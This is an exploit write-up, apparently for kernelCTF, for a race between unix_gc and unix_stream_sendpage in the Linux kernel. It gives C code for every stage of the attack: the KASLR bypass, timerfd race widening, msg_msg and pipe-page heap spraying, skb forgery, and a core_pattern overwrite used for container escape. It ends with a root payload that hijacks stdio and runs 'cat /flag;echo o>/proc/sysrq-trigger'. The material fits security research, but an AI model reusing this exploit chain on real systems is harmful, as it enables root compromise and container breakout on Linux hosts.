# Exploit Tech Overview

The vulnerability is race between unix_gc with unix_stream_sendpage.
Because `unix_stream_sendpage` grab skb without lock. It give unix_gc the chance to conccurent do operation on the sk_receive_queue.
We use timerfd to raise exception handler to extend the race windows, buy more time for unix_gc to free skb and let us cross-cache and spray.
```C
static ssize_t unix_stream_sendpage(struct socket *socket, struct page *page,
				    int offset, size_t size, int flags)
{
	...

	skb = skb_peek_tail(&other->sk_receive_queue); //nolock and peek the tail skb
	if (tail && tail == skb) {
		skb = newskb;
	} else if (!skb || !unix_skb_scm_eq(skb, &scm)) {
		if (newskb) {
			skb = newskb;
		} else {
			tail = skb;
			goto alloc_skb;
		}
	} else if (newskb) {
		/* this is fast path, we don't necessarily need to
		 * call to kfree_skb even though with newskb == NULL
		 * this - does no harm
		 */
		consume_skb(newskb);
		newskb = NULL;
	}
	// timerfd expire to raise exception handler here, at same time unix_gc is doing free the skb we grabed before
	if (skb_append_pagefrags(skb, page, offset, size)) {
		tail = skb;
		goto alloc_skb;
	}
```

Since skb is freed before enter function `skb_append_pagefrags`. We can forge skb's contents to our control data.
Using this vulnerability, we can insert a skb_frag on an arbitrary kernel address by the following calling path 
skb_append_pagefrags -> skb_fill_page_desc_noacc -> __skb_fill_page_desc_noacc.

```C
static inline void __skb_fill_page_desc_noacc(struct skb_shared_info *shinfo,
					      int i, struct page *page,
					      int off, int size)
{
	skb_frag_t *frag = &shinfo->frags[i];

	/*
	 * Propagate page pfmemalloc to the skb if we can. The problem is
	 * that not all callers have unique ownership of the page but rely
	 * on page_is_pfmemalloc doing the right thing(tm).
	 */
	frag->bv_page		  = page;
	frag->bv_offset		  = off;
	skb_frag_size_set(frag, size);
}

```

According to the skb_frag_t struct layout, bv_offset is more controllable and it's value is between 0 to 0xfff.
We are interested when value is 0, because we can use choose to null first few bytes of a kernel address.
In this case, `struct msg_msg` become our target object again.
```C
typedef struct bio_vec skb_frag_t;
struct bio_vec {
        struct page *              bv_page;                                              /*     0     8 */
        unsigned int               bv_len;                                               /*     8     4 */
        unsigned int               bv_offset;                                            /*    12     4 */

        /* size: 16, cachelines: 1, members: 3 */
        /* last cacheline: 16 bytes */
};
```

Let's take a look into msg_msg struct layout and a sample memory layout of msg_msgs

```C
struct msg_msg {
        struct list_head {
                struct list_head * next;                                                 /*     0     8 */
                struct list_head * prev;                                                 /*     8     8 */
        } m_list; /*     0    16 */
        long int                   m_type;                                               /*    16     8 */
        /* typedef size_t -> __kernel_size_t -> __kernel_ulong_t */ long unsigned int          m_ts; /*    24     8 */
        struct msg_msgseg *        next;                                                 /*    32     8 */
        void *                     security;                                             /*    40     8 */

        /* size: 48, cachelines: 1, members: 5 */
        /* last cacheline: 48 bytes */
};
```

```
0xffff8880082e2380:     0xffff888008705080      0xffff888007ebf680 //m_list.next m_list.prev
0xffff8880082e2390:     0x000000000000008b      0x0000000000000050 //m_type m_ts
0xffff8880082e23a0:     0x0000000000000000      0x0000000000000000 //next security
0xffff8880082e23b0:     0x0000000000000408      0x0000000000000000 //data
0xffff8880082e23c0:     0x0000001000000000      0x0000000000000000
0xffff8880082e23d0:     0x0000000000000000      0x0000000000000000
0xffff8880082e23e0:     0x0000000000000000      0x0000000000000000
0xffff8880082e23f0:     0x0000000000000000      0x0000000000000000
0xffff8880082e2400:     0xffff888008705f80      0xffff888007ebf800 //m_list.next m_list.prev
0xffff8880082e2410:     0x000000000000008b      0x0000000000000050 //m_type m_ts
0xffff8880082e2420:     0x0000000000000000      0x0000000000000000 //next security
0xffff8880082e2430:     0x0000000000000412      0x0000000000000000 //data
0xffff8880082e2440:     0x0000001000000000      0x0000000000000000
0xffff8880082e2450:     0x0000000000000000      0x0000000000000000
0xffff8880082e2460:     0x0000000000000000      0x0000000000000000
0xffff8880082e2470:     0x0000000000000000      0x0000000000000000
```

If we choose (0xffff8880082e2400+2-0x10) as our skb_frag_t, after return from function `__skb_fill_page_desc_noacc`, the above memory layout will become as follow
```
0xffff8880082e2380:     0xffff888008705080      0xffff888007ebf680 //m_list.next m_list.prev
0xffff8880082e2390:     0x000000000000008b      0x0000000000000050 //m_type m_ts
0xffff8880082e23a0:     0x0000000000000000      0x0000000000000000 //next security
0xffff8880082e23b0:     0x0000000000000408      0x0000000000000000 //data
0xffff8880082e23c0:     0x0000001000000000      0x0000000000000000
0xffff8880082e23d0:     0x0000000000000000      0x0000000000000000
0xffff8880082e23e0:     0x0000000000000000      0x0000000000000000
0xffff8880082e23f0:     0xea00001223400000      0x000000001000ffff
0xffff8880082e2400:     0xffff888008700000      0xffff888007ebf800 //m_list.next m_list.prev
0xffff8880082e2410:     0x000000000000008b      0x0000000000000050 //m_type m_ts
0xffff8880082e2420:     0x0000000000000000      0x0000000000000000 //next security
0xffff8880082e2430:     0x0000000000000412      0x0000000000000000 //data
0xffff8880082e2440:     0x0000001000000000      0x0000000000000000
0xffff8880082e2450:     0x0000000000000000      0x0000000000000000
0xffff8880082e2460:     0x0000000000000000      0x0000000000000000
0xffff8880082e2470:     0x0000000000000000      0x0000000000000000
```

m_list.next first two byte has been overwrite to null byte and make it point to another msg_msg.
With two msg_msg->m_list.next point to same address, we can use known exploit tech to achieve container escape.


# Exploit Tech Detail

The exploit is consist in the following steps
* EntryBleed: Breaking KASLR under KPTI with Prefetch (CVE-2022-4543)
* Prepare timerfd
* Spray large amount msg_msg
* Prepare refcount circle to make unix_gc free skbs
* Race between unix_gc with unix_stream_sendpage
* Reclaim SKB with pipe page buffer
* msg_msg exploit technique
* Achieve container escape.

The most unreliable and hard to success is at `Race between unix_gc with unix_stream_sendpage`.
Because lack of the information to set timeout at right place in nanoseconds, we tried value from 200 ~ 4096.
Depend on how lucky we are we might be hit the right place within few minutes or keep fail after half hour.
To trigger vulns more easily, we recommend to patch the following code to linux kernel.

```diff
diff --git a/net/unix/af_unix.c b/net/unix/af_unix.c
index 5b19b6c53..3bdc0aa94 100644
--- a/net/unix/af_unix.c
+++ b/net/unix/af_unix.c
@@ -2347,7 +2347,7 @@ static ssize_t unix_stream_sendpage(struct socket *socket, struct page *page,
                consume_skb(newskb);
                newskb = NULL;
        }
-
+       mdelay(10);
        if (skb_append_pagefrags(skb, page, offset, size)) {
                tail = skb;
                goto alloc_skb;
```


## EntryBleed: Breaking KASLR under KPTI with Prefetch (CVE-2022-4543)
This technique we used to bypass KASLR.  This technique we're able to predict/guess the physmap address of the msg_msg object in kernel heap. In our exploit this technique also shown to get kernel .text address, but it will be corrected later when we get kernel .text address via pipe_buffer leak to make it more reliable. You can find the details about this technique [here](https://www.willsroot.io/2022/12/entrybleed.html).

## Prepare timerfd
We adopt the exploit tech from `Jann's blog Racing against the clock -- hitting a tiny kernel race window` to extend the race windows
To make race windows larger on kernels without CONFIG_PREEMPT.
* make a timerfd expire in that window (which will run in an interrupt handler - in other words, in hardirq context)
* make sure that the wakeup triggered by the timerfd has to churn through many waitqueue items created by epoll

So function `do_epoll_enqueue` in our exploit code is to do such thing
```C
void do_epoll_enqueue(int fd)
{
	int cfd[2];
	socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
	for (int k = 0; k < 0x4; k++)
	{
		if (fork() == 0)
		{
			for (int i = 0; i < 0x100; i++)
			{
				timefds[i] = SYSCHK(dup(fd));
			}
			for (int i = 0; i < 0xc0; i++)
			{
				epfds[i] = SYSCHK(epoll_create(0x1));
			}
			for (int i = 0; i < 0xc0; i++)
			{
				for (int j = 0; j < 0x100; j++)
				{
					// queue as many as possible async waiters at timerfd waitqueue
					epoll_ctl_add(epfds[i], timefds[j], 0);
				}
			}
			write(cfd[1], buf, 1);
			raise(SIGSTOP); // stop here for nothing and just keep epoll alive
		}
		// sync to make sure it has queue what we need
		read(cfd[0], buf, 1);
	}
	close(cfd[0]);
	close(cfd[1]);
}
```
## Spray large amount msg_msg
To bypass KASLR we using EntryBleed to guess msg_msg address at kernel heap physmap address. To make it more stable
we spray large amount msg_msg in kernel heap to increase probability guessed kernel address is msg_msg object.
There's total 794MB spray data, and this is enough to perform exploitation in kernelCTF instance with 4GB of RAM.
This is following code where we setup and spray kernel heap with msg_msg.

```c
#define NUM_QUEUE_MAX 32000
#define NUM_QUEUE_RESV 100 // reserved for exploitation
#define NUM_QUEUE (NUM_QUEUE_MAX - NUM_QUEUE_RESV)
#define NUM_MSG 204 // calculated from 16384 (max bytes in queue) / MSG_SIZE
#define CHUNK_SIZE 0x80
#define MSG_SIZE (CHUNK_SIZE - 0x30)

// Spray as many msg_msgs as possible to full the kernel heap memory
// For 4 GB RAM system, we spray NUM_QUEUE * NUM_MSG * CHUNK_SIZE = 794 MB msg_msg
// It's enough for us to analyze and make our choose kernel address become a msg_msg.
int setup_msg()
{
	msqid = malloc(sizeof(*msqid) * 40000);
	hackq = malloc(sizeof(*msqid) * NUM_QUEUE_RESV);
	printf("setup msg start..\n");
	memset(&msg.mtext[0], 0, 0x2000);
	msg.mtype = 1;
	system("ipcrm --all=msg");
	for (int i = 0; i < NUM_QUEUE; i++)
	{
		msqid[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		SYSCHK(msqid[i]);
	}
	for (int i = 0; i < NUM_QUEUE_RESV; i++)
	{
		hackq[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		SYSCHK(hackq[i]);
	}
	// Fake `struct skb_shared_info` in the data of msg_msg
	// We will choose a specific kernel heap address as `skb_shinfo(skb)`
	msg.mtext[0x44 - 0x30] = '\x10'; // nr_frags
	for (int j = 0; j < NUM_MSG; j++)
	{
		for (int i = 0; i < NUM_QUEUE; i++)
		{
			*(size_t *)&msg.mtext[0] = i; // queue identifier stored here
			msg.mtype = j + 1; // msg index identifier
			SYSCHK(msgsnd(msqid[i], &msg, MSG_SIZE, IPC_NOWAIT));
		}
	}
	printf("setup msg done\n");
}
```
We spray in some defined amount of message queue and some defined amount msg_msg for each allocated message queue.
For every message we add queue identifier and message identifier that will useful in exploitation, for example 
to check corrupted message queue and perform msg_msg "feng shui" in accurate and stable.
Queue identifier means queue the message is in. Msg identifier means what order the msg is in the queue.

## Prepare refcount circle to make unix_gc free skbs
We need to make unix_gc detect a refcount circle and do garbage collection to clear selected unix_sockets' sk_receive_queue.
Init two pair unix sockets named A, B, C and D. A's unix_peer is B and C's unix_peer is D.
By send C to A to make B's sk_receive_queue hold a refcount of C.
By send B to D to make C's sk_receive_queue hold a refcount of D.
B and C become a refcount circle, and it will clear these sk_receive_queue when trigger unix_gc.

In this step also we sending a lot of skbs to exploit use-after-free by performing cross cache attack, so we can reclaim uaf object by our own controlled data later.

The following code snippet is to do such thing.
```C
			SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, fds));
			A = fds[0];
			B = fds[1];
			SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, fds));
			C = fds[0];
			D = fds[1];

			// Max the socket send/recv buffer, because we need to spray a certain number skb
			// For heap cross cache attack
			size_t val = 0x400000;
			SYSCHK(SYSCHK(setsockopt(D, SOL_SOCKET, SO_SNDBUF, &val, 4)));
			SYSCHK(SYSCHK(setsockopt(A, SOL_SOCKET, SO_SNDBUF, &val, 4)));
			SYSCHK(SYSCHK(setsockopt(B, SOL_SOCKET, SO_RCVBUF, &val, 4)));
			SYSCHK(SYSCHK(setsockopt(C, SOL_SOCKET, SO_RCVBUF, &val, 4)));

			// Spray a lot skb a head for heap feng shui
			*(int *)CMSG_DATA(cmsg) = C;
			for (int i = 0; i < 0x100; i++)
				SYSCHK(sendmsg(D, &msg, 0));

			// Make B's recv buffer hold C, datapipe and signalpipe refcount
			cmsg->cmsg_len = CMSG_LEN(sizeof(int) * 3);
			msg.msg_controllen = cmsg->cmsg_len;
			((int *)CMSG_DATA(cmsg))[0] = signalpipe[1]; //when release this file, spray_pipe_page_thread will wake up when CPU#1 has free cpu time.
			((int *)CMSG_DATA(cmsg))[1] = datapipe[1]; // when release this file, because pipe lock is hold in splice, it will sleep and let CPU#1 to context switch
			((int *)CMSG_DATA(cmsg))[2] = C;
			SYSCHK(sendmsg(A, &msg, 0));

			// decrease unnecessary refcount
			close(signalpipe[1]);
			close(datapipe[1]);

			// Make C's recv buffer hold B refcount
			cmsg->cmsg_len = CMSG_LEN(sizeof(int));
			msg.msg_controllen = cmsg->cmsg_len;
			*(int *)CMSG_DATA(cmsg) = B;
			SYSCHK(sendmsg(D, &msg, 0));

			// Spray a lot skb at tail for heap feng shui
			*(int *)CMSG_DATA(cmsg) = C;
			for (int i = 0; i < 0x100; i++)
				SYSCHK(sendmsg(D, &msg, 0));

			// decrease unnecessary refcount
			close(B);
			close(C);
```

## Race between unix_gc with unix_stream_sendpage
Init two threads to race between unix_gc with unix_stream_sendpage.

Function `trigger_unix_stream_sendpage` in our exploit code will setup a timeout in nanosecond and use system call splice to insert a pipe page to unix_socket.
It will call unix_stream_sendpage to reach our vulnerable function.
```C
void *trigger_unix_stream_sendpage(void *x)
{
	set_cpu(0);
	// setup a certain timeout nanosecond
	struct itimerspec new = {.it_value.tv_nsec = timeout};
	// Send signal to trigger_unix_gc_thread
	write(sync_job[1], "H", 1);
	SYSCHK(timerfd_settime(tfd, TFD_TIMER_CANCEL_ON_SET, &new, NULL));
	splice(datapipe[0], 0, A, 0, 0x1000, 0);
	close(datapipe[0]);
	return NULL;
}

```
Function `trigger_unix_gc_thread` in our exploit code will trigger unix_gc by release a unused unix socket.
It will detect our prepared refcount circle and clear these sk_receive_queue.
```C
void *trigger_unix_gc_thread(void *x)
{
	set_cpu(1);
	int s = socket(AF_UNIX, SOCK_STREAM, 0);
	read(sync_job[0], &x, 1);
	// Release a unix socket will trigger unix_gc
	close(s);
	return NULL;
}
```

## Reclaim SKB with pipe page buffer
We need to perform cross cache attack to reclaim skb with our own controlled data. This time we use [pipe page buffer](https://elixir.bootlin.com/linux/latest/source/fs/pipe.c#L498) to reclaim the skb and control the skb value.
It will performed by `spray_pipe_page_thread` in seperate thread.

```c
void *spray_pipe_page_thread(void *x)
{
	set_cpu(1);
	// After unix_gc clean skb, this thread will wakeup and start spray pipe page.
	read(signalpipe[0], buf, 1);
	for (int i = 0; i < 0x100; i++)
		for (int j = 0; j < 0x10; j++)
			write(spray_pipe[i][1], spray_data, 0x1000);

	return NULL;
}

#define FIXED_OFFSET 0x140000000
#define PAGE_OFFSET_BASE (LEAKED_KHEAP - FIXED_OFFSET)
#define TARGET_PHYS_ADDR 0x82e2380
#define PHYS_ADDR_MSG (PAGE_OFFSET_BASE + TARGET_PHYS_ADDR) // guessed msg_msg address

// spray data
int main(...) {
    ...
    // Prepare spray data for reallocate freed skb as pipe page data.
	// Craft skb->head and skb->end to control skb_shinfo pointer
	for (int i = 0; i < 0x10; i++)
	{
		*(size_t *)&spray_data[i * 0x100 + 0xc8] = PHYS_ADDR_MSG; // skb->head
		*(size_t *)&spray_data[i * 0x100 + 0xc0] = 0x42;		  // skb->end
	}
    ...
}
```

## msg_msg exploit technique
This primitive let us to partially overwrite msg.m_list.next of the msg we spray with `0000`. It will make two msg_msg in different message queue
point to the same msg_msg object.
After the bug is trigerred, exploit continue to check and find if there's corrupted message in the queues. We traverse every message
in every queue to check its identifier. We retrieve j-th msg in i-th queue, then check with the identifier stored in retrieved msg object,
if it's not same then we know this msg that will act as "victim" msg, because this msg pointed by another two msg (by mlist.next) and we can
perform msg_msg "feng shui" here.

Exploit continue to perform "feng shui" on msg_msg object. First we leak kernel heap address for prepared ROP address and pipe_buffer address at
kmalloc-1024. Then, we perform known arbitrary free on pipe_buffer technique using `msg.security` and bypass `list_del` (with CONFIG_DEBUG_LIST=y)
(https://github.com/star-sg/security-research/blob/CVE-2023-4622/pocs/linux/kernelctf/CVE-2023-3390_lts_cos_mitigation/docs/novel-techniques.md#config_debug_list-leading-to-expand-vulnerabilitys-capability).

We overwrite pipe_buffer object with stack pivot gadget, and after we closed all the pipes it will execute stack pivot gadget and finally landed on ROP gadget that generated before.

## Achieve container escape.

Once we control the kernel RIP we crafted ROP to cause core_pattern being overwritten to `|/proc/%P/fd/666`:

We then use memfd and write an executable file payload in fd 666.
```C
int check_core()
{
    // Check if /proc/sys/kernel/core_pattern has been overwritten
    char buf[0x100] = {};
    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
    int memfd = memfd_create("", 0);
    SYSCHK(sendfile(memfd, open("root", 0), 0, 0xffffffff));
    dup2(memfd, 666);
    close(memfd);
    while (check_core() == 0)
        sleep(1);
    *(size_t *)0 = 0;
}
```

Later when coredump happened, it will execute our executable file as root in root namespace:
```C
*(size_t*)0=0; //trigger coredump
```

Executable file `root` is used to spawn shell when coredump happened. This is the code looks like:
```c++
void* job(void* x){
	FILE* fp = popen("pidof billy","r");
	fread(buf,1,0x100,fp);
	fclose(fp);
	int pid = strtoull(buf,0,10);
	sprintf(path,"/proc/%d/ns/net",pid);
	int pfd = syscall(SYS_pidfd_open,pid,0);
	int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
	int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
	int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
	dup2(stdinfd,0);
	dup2(stdoutfd,1);
	dup2(stderrfd,2);
	system("cat /flag;echo o>/proc/sysrq-trigger");
}
int main(int argc,char** argv){	
	job(0);
}
```
